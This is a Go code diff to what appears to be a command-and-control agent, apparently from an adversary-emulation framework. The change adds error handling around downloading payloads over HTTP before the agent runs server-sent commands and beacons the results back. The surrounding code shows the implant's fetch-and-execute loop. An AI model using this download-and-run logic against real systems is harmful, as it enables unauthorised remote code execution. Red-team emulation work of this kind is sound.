@@ -36,13 +36,18 @@ func (contact HTTP) Communicate(agent *util.AgentConfig, beacon util.Beacon) uti
 			}
 			for _, link := range tempB.Links {
 				var payloadPath string
+				var payloadErr error
 				if len(link.Payload) > 0 {
-					payloadPath = requestPayload(link.Payload)
+					payloadPath, payloadErr = requestPayload(link.Payload)
 				}
-				response, status, pid := commands.RunCommand(link.Request, link.Executor, payloadPath, agent)
-				link.Response = strings.TrimSpace(response)
-				link.Status = status
-				link.Pid = pid
+				if payloadErr == nil {
+					response, status, pid := commands.RunCommand(link.Request, link.Executor, payloadPath, agent)
+					link.Response = strings.TrimSpace(response)
+					link.Status = status
+					link.Pid = pid
+				} else {
+					payloadErrorResponse(payloadErr, agent, &link)
+				}
 				beacon.Links = append(beacon.Links, link)
 			}
 		}
@@ -66,15 +71,18 @@ func checkValidHTTPTarget(address string, fatal bool) (bool, error) {
 	return true, nil
 }
 
-func requestHTTPPayload(address string) ([]byte, string, error) {
+func requestHTTPPayload(address string) ([]byte, string, int, error) {
 	valid, err := checkValidHTTPTarget(address, false)
 	if valid {
-		body, _, code, err := request(address, "GET", []byte{})
+		body, _, code, netErr := request(address, "GET", []byte{})
+		if netErr != nil {
+			return nil, "", code, netErr
+		}
 		if code == 200 {
-			return body, path.Base(address), err
+			return body, path.Base(address), code, netErr
 		}
 	}
-	return nil, "", err
+	return nil, "", 0, err
 }
 
 func beaconPOST(address string, beacon util.Beacon) []byte {
